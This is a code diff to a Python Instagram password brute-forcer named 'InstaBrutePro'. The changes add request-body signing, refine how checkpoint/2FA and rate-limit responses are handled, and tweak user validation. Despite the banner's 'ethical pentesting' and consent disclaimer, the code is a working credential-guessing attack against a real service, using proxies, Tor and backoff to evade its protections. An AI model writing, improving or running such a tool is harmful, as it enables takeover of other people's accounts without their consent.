@@ -36,7 +36,7 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v3.5 - by Soly {Colors.NC}")
+print(f"           {Colors.CYAN} InstaBrutePro v3.6 - by Soly {Colors.NC}")
 print(f"{Colors.YELLOW}[*] Smartest Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
 print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
@@ -293,6 +293,11 @@ def get_csrf(proxies):
             session.close()
     return None
 
+def sign_payload(payload):
+    body = json.dumps(payload, separators=(',', ':'))
+    sig = hmac.new(SIG_KEY.encode(), body.encode(), hashlib.sha256).hexdigest()
+    return f"ig_sig_key_version=4&signed_body={sig}.{body}"
+
 def verify_password(username, password):
     """Verify a potential success with a direct, non-proxied request."""
     session = requests.Session()
@@ -381,7 +386,7 @@ def try_password(username, password, proxies):
         timestamp = str(int(time.time()))
         payload = {
             'username': username,
-             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
             'queryParams': '{}',
             'optIntoOneTap': 'false'
         }
@@ -419,8 +424,8 @@ def try_password(username, password, proxies):
                     current_delay = min(current_delay * 2, 2.0)
                     continue
             elif any(x in resp.text for x in ['checkpoint_required', 'two_factor_required']):
-                print(f"{Colors.YELLOW}[!] Checkpoint on {password} - Manual verify required! Check Instagram app for {username}.{Colors.NC}")
-                logging.debug(f"Checkpoint for {password}: {resp.text}")
+                print(f"{Colors.YELLOW}[!] Checkpoint/2FA on {password} - Manual verify required! Check Instagram app for {username}.{Colors.NC}")
+                logging.debug(f"Checkpoint/2FA for {password}: {resp.text}")
                 current_delay = min(current_delay * 2, 2.0)
                 return False, csrf
             elif any(x in resp.text for x in ['"spam":true', 'rate_limit']):
@@ -498,9 +503,10 @@ def main():
 
     # Validate user
     print(f"{Colors.YELLOW}[*] Validating username: {args.u}...{Colors.NC}")
+    import subprocess
     result = subprocess.run(['python', 'validate_user.py', args.u], capture_output=True, text=True)
     if "Valid" not in result.stdout:
-        print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
+        print(f"{Colors.RED}[!] Invalid username. Exiting.{Colors.NC}")
         return
 
     # Check Tor ports
@@ -540,7 +546,7 @@ def main():
     else:
         words = generate_variations(keywords, args.u, mode, max_variations)
     print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")
-   
+
     # Load checkpoint
     if args.r:
         checkpoint = load_checkpoint()
